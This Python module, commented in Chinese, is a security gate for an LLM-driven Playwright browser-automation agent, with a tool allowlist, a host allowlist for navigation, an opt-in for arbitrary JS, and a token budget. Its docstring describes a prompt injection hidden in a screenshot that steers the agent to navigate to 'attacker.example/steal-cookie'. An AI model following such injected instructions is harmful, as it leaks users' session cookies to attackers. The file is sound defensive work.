"""SecurityGuard + TokenBudget — UI 自动化执行的安全闸门。

设计文档：``docs/PHASE2_DESIGN.md`` §3.3.4 + §3.4。

三层校验：
1. **工具白名单**：``ALLOWED_TOOLS`` 限定模型只能调真正读 / 写浏览器的安全
   工具；``browser_evaluate``（任意 JS 执行）默认禁止，必须在环境配置中
   显式开启 ``enable_browser_evaluate``。
2. **URL 域名校验**：``browser_navigate`` 的 url 必须命中 ``environment.allowed_hosts``，
   防止模型被 prompt 注入诱导跳到攻击者站点（典型：被截图里嵌的恶意提示
   引导 ``navigate("https://attacker.example/steal-cookie")``）。
3. **Token 预算守卫**：``TokenBudget`` 累加每轮 LLM usage_total；超 80%
   触发一次性 warning（让 SSE 提示用户），超 100% 抛 ``BudgetExceededError``
   终止本次执行。

EnvironmentLike Protocol 让本模块**不依赖** Task 8.1 才会建出来的
``TestEnvironment`` model — 任何含 ``allowed_hosts`` / ``token_budget`` /
``enable_browser_evaluate`` 字段的对象（数据库模型、dataclass、SimpleNamespace
甚至测试 mock）都能传进来。
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Protocol, runtime_checkable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


# ─── 异常类型 ─────────────────────────────────────────────────────────


class SecurityError(RuntimeError):
    """工具调用违反安全策略时抛出。

    被 ExecutionEngine 捕获后会标记当前 step.status = "blocked_by_security"
    并写到 ui_step_results.error_reason；不会因此中断后续用例（除非是预算
    超限，那是更严重的 BudgetExceededError）。
    """


class BudgetExceededError(SecurityError):
    """Token 预算耗尽。继承自 SecurityError 方便统一捕获，但在 Engine 层
    会被特殊处理 → 直接终止整个 execution（status=aborted_budget），
    不再继续后续用例。
    """


# ─── EnvironmentLike Protocol ────────────────────────────────────────


@runtime_checkable
class EnvironmentLike(Protocol):
    """SecurityGuard / BrowserBundle 所需的环境配置最小契约。

    Task 8.1 的 ``TestEnvironment`` ORM model 会自然满足这个 Protocol；
    本 task 不要 import 那个 model（避免循环 + 让 Task 7.x 测试无依赖）。

    字段说明：
    - ``base_url``：测试目标的根 URL，例如 ``https://staging.foo.com``
    - ``allowed_hosts``：放行的 host 列表。host 可写：
        - 精确域名 ``staging.foo.com``
        - 通配符子域 ``*.foo.com`` → 命中 ``a.foo.com`` / ``b.x.foo.com``
        - 含端口 ``staging.foo.com:8443``
        - 全通配 ``*`` → 关闭 host 校验、放行任意 http/https URL（仅限内
          网调试 / 全开放环境，生产环境慎用）
      创建环境时应自动从 base_url 提取 host 写入。
    - ``token_budget``：单次执行允许消耗的 LLM token 总量。
    - ``enable_browser_evaluate``：是否把 ``browser_evaluate`` 加入白名单。
      默认 False —— 该工具能跑任意 JS，仅限信任环境（如本地 dev）开启。
    """

    base_url: str
    allowed_hosts: list[str]
    token_budget: int
    enable_browser_evaluate: bool


# ─── TokenBudget ──────────────────────────────────────────────────────


@dataclass
class TokenBudget:
    """累计 token 消耗追踪器。

    使用方式：
    ```python
    budget = TokenBudget(limit=env.token_budget)
    # 每轮 LLM 调用后：
    budget.add(usage_total)
    warning = budget.maybe_warning()  # 第一次跨 80% 阈值时返回提示语
    if warning: hub.publish(sse_info(warning))
    SecurityGuard(env, budget).check(...)  # 内部判超 100%
    ```

    设计要点：
    - ``warned_at`` 只在第一次跨过 80% 时被赋值，避免 SSE 刷屏
    - ``add`` 接受负数会被视为 0（防异常 usage 数据带 bug）
    """

    limit: int
    consumed: int = 0
    warned_at: int | None = None
    """首次跨过 80% 阈值时记下 consumed 快照，作为"已通知"标记。"""

    WARN_RATIO: float = field(default=0.80, repr=False)

    def add(self, used: int) -> None:
        """累加一次 LLM 调用的 token 消耗。``used`` 通常来自 OpenAI
        ``usage.total_tokens``。负数 / None 容忍处理，不抛错。
        """
        if used is None or used < 0:
            return
        self.consumed += int(used)

    @property
    def ratio(self) -> float:
        """已用 / 上限。limit=0 时返回 ``inf`` 让 over_limit 直接成立。"""
        if self.limit <= 0:
            return float("inf")
        return self.consumed / self.limit

    @property
    def over_limit(self) -> bool:
        return self.ratio >= 1.0

    def maybe_warning(self) -> str | None:
        """第一次跨过 80% 时返回一句中文提示，否则返回 None。

        ExecutionEngine 拿到非 None 后通过 SSE ``info`` 事件吐给前端，
        让用户知道"再跑下去就要超预算了"。
        """
        if self.warned_at is not None:
            return None
        if self.ratio < self.WARN_RATIO:
            return None
        self.warned_at = self.consumed
        pct = int(self.ratio * 100)
        return (
            f"⚠️ 已消耗 {self.consumed:,} / {self.limit:,} tokens（{pct}%），"
            "接近本次执行预算上限。建议尽快收尾，否则到达 100% 时执行会被终止。"
        )


# ─── SecurityGuard ────────────────────────────────────────────────────


# 与 PHASE2_DESIGN.md §3.3.4 一一对应 — 改动这个集合需要同步更新设计文档。
# 命名严格对齐 @playwright/mcp 暴露的 tool 名（不带 namespace 前缀）。
#
# 白名单包含 playwright-mcp **常用且安全**的 23 个工具中的大多数；少数高危
# 工具（``browser_evaluate`` / ``browser_install`` / ``browser_pdf_save`` /
# ``browser_file_upload``）刻意不加入，需要时单独通过环境配置开启
# （``enable_browser_evaluate`` 那种 opt-in flag）。
_BASE_ALLOWED_TOOLS: frozenset[str] = frozenset({
    # 导航
    "browser_navigate",
    "browser_navigate_back",
    "browser_navigate_forward",
    "browser_resize",
    # 交互（点击 / 输入 / 选择 / 拖拽 / 悬停 / 按键）
    "browser_click",
    "browser_type",
    "browser_select_option",   # 兼容 @playwright/mcp 的命名
    "browser_select",          # 兼容旧版命名
    "browser_check",
    "browser_press_key",
    "browser_hover",
    "browser_drag",
    # 表单：browser_fill_form 一次性填多个字段（playwright-mcp 0.x 新增），
    # 等价于一系列 browser_type，对模型友好；不加白名单时 AI 调它会 hard fail
    # 看到登录表单时尤其会走这条路径，必须放行
    "browser_fill_form",
    # 弹窗 / 对话框
    "browser_handle_dialog",
    # 快照 / 截图
    "browser_snapshot",
    "browser_screenshot",
    "browser_take_screenshot",  # 部分版本命名
    # 等待
    "browser_wait_for",
    # 只读类
    "browser_console_messages",
    "browser_network_requests",
    # tab 管理（list / select / close 等子操作）
    "browser_tabs",
    "browser_tabs_list",        # 旧版本拆开的命名
    "browser_tabs_select",
    "browser_tabs_close",
    # 关闭 tab/page（playwright-mcp 较新版本）
    "browser_close",
})

# 高危工具：必须在环境层显式开启 enable_browser_evaluate=True 才放行
_RISKY_TOOLS: frozenset[str] = frozenset({"browser_evaluate"})

# 平台自定义物料工具：``data_platform_tools.register_data_tools`` 暴露的 6 个
# ``platform_*`` 工具。这些 tool 的入参 / 行为完全在平台代码控制下（不会
# 操作浏览器，不会 navigate 到外部域名），因此安全策略上"始终放行"——
# 不进 _BASE_ALLOWED_TOOLS（避免与 MCP browser_* 命名混淆），用 prefix 单独
# 判定。
_PLATFORM_TOOL_PREFIX = "platform_"


class SecurityGuard:
    """每个 execution 一个实例。``check()`` 在每次 tool_call 前被
    ``StepRunner`` 调用，违规直接 raise 终止本 step（或 execution）。

    使用方式：
    ```python
    guard = SecurityGuard(environment=env, budget=budget)
    guard.check("browser_navigate", {"url": "https://staging.foo.com/login"})
    # → 通过，无返回值；违规 raise
    ```
    """

    def __init__(self, *, environment: EnvironmentLike, budget: TokenBudget) -> None:
        self.environment = environment
        self.budget = budget

    @property
    def allowed_tools(self) -> frozenset[str]:
        """根据环境配置动态扩展白名单（含 browser_evaluate 与否）。

        每次访问都重算，避免 environment 字段被外部改动后白名单仍是旧值。
        """
        if getattr(self.environment, "enable_browser_evaluate", False):
            return _BASE_ALLOWED_TOOLS | _RISKY_TOOLS
        return _BASE_ALLOWED_TOOLS

    # ── 主入口 ───────────────────────────────────────────────────
    def check(self, tool_name: str, args: dict[str, Any] | None = None) -> None:
        """在 tool_call 真正执行前调用。任何违规 raise，正常通过返回 None。

        校验顺序：预算 → 白名单 → 域名。预算放最前是为了"已经超预算的
        execution 不再做任何额外动作"。
        """
        # 0) 预算优先：超 100% 立即抛 BudgetExceededError
        if self.budget.over_limit:
            raise BudgetExceededError(
                f"已超过 token 预算 {self.budget.limit:,}（消耗 {self.budget.consumed:,}），执行终止"
            )

        # 1) 工具白名单
        raw_name = self._strip_namespace(tool_name)
        # platform_* 工具由本平台 data_platform_tools 注册、行为完全可控，
        # 不操作浏览器 / 不发外网请求，跳过白名单与域名校验。
        if raw_name.startswith(_PLATFORM_TOOL_PREFIX):
            return
        if raw_name not in self.allowed_tools:
            extra = ""
            if raw_name in _RISKY_TOOLS:
                extra = "（高危工具，需在环境配置开启 enable_browser_evaluate=True）"
            raise SecurityError(f"工具 {raw_name} 不在白名单{extra}")

        # 2) URL 域名校验（仅 navigate 类工具）
        if raw_name == "browser_navigate":
            url = (args or {}).get("url", "")
            if not isinstance(url, str) or not url:
                raise SecurityError("browser_navigate 缺少 url 参数")
            if not _host_in_allowlist(url, self.environment.allowed_hosts):
                raise SecurityError(
                    f"URL {url} 的 host 不在 environment.allowed_hosts 允许列表"
                )

    # ── 内部 helper ──────────────────────────────────────────────
    @staticmethod
    def _strip_namespace(tool_name: str) -> str:
        """剥掉 ``<execution_id>__`` 命名空间前缀，得到原始 tool 名。

        Task 7.2 ``MCPBridge.register_into_agent_tools`` 给所有 MCP tool
        加了命名空间，``StepRunner`` 转 tool_call 时也会带这个前缀，
        但白名单是按"原始 tool 名"维护的。

        分隔符为 ``__``（OpenAI 工具名规范要求 ``^[a-zA-Z0-9_-]+$``）。同时
        兼容旧 ``:`` 前缀以防有遗留调用栈。
        """
        if "__" in tool_name:
            return tool_name.rsplit("__", 1)[-1]
        if ":" in tool_name:
            return tool_name.rsplit(":", 1)[-1]
        return tool_name


# ─── URL host 匹配 ────────────────────────────────────────────────────


def _host_in_allowlist(url: str, allowed_hosts: list[str]) -> bool:
    """判断 url 的 host 是否命中 allowlist。

    匹配规则：
    - 全通配：allowlist 里写一条 ``*`` → 放行任意 http/https URL（关闭
      host 校验，仅限内网 / 全开放调试环境用）
    - 精确匹配：``staging.foo.com`` == ``staging.foo.com``
    - 通配符子域：``*.foo.com`` 命中 ``a.foo.com`` / ``b.x.foo.com``，
      但**不**命中裸根 ``foo.com``（要根也要明确写一条 ``foo.com``）
    - 端口：allowlist 里写不写端口都可以；写了就严格匹配端口，没写就忽略
    - scheme：仅允许 http / https，其他协议（file:// / javascript: 等）一律拒
    - 大小写：host 不区分大小写

    返回 True / False；不抛异常（解析失败一律视为不匹配）。
    """
    if not isinstance(url, str) or not url:
        return False
    try:
        parsed = urlparse(url.strip())
    except Exception:  # noqa: BLE001
        return False
    if parsed.scheme.lower() not in ("http", "https"):
        return False
    netloc = parsed.netloc.lower()
    if not netloc:
        return False
    # netloc 可能含 user@host:port，提取 host 部分
    if "@" in netloc:
        netloc = netloc.split("@", 1)[-1]
    actual_host = netloc  # 含端口
    actual_hostname = netloc.split(":", 1)[0]

    for entry in (allowed_hosts or []):
        if not entry:
            continue
        rule = entry.strip().lower()
        if not rule:
            continue
        # 全通配：关闭 host 校验
        if rule == "*":
            return True
        # 子域通配
        if rule.startswith("*."):
            domain = rule[2:]
            if actual_hostname.endswith("." + domain):
                return True
            continue
        # 精确：含端口必须严格相等；不含端口比较 hostname
        if ":" in rule:
            if actual_host == rule:
                return True
        else:
            if actual_hostname == rule:
                return True
    return False
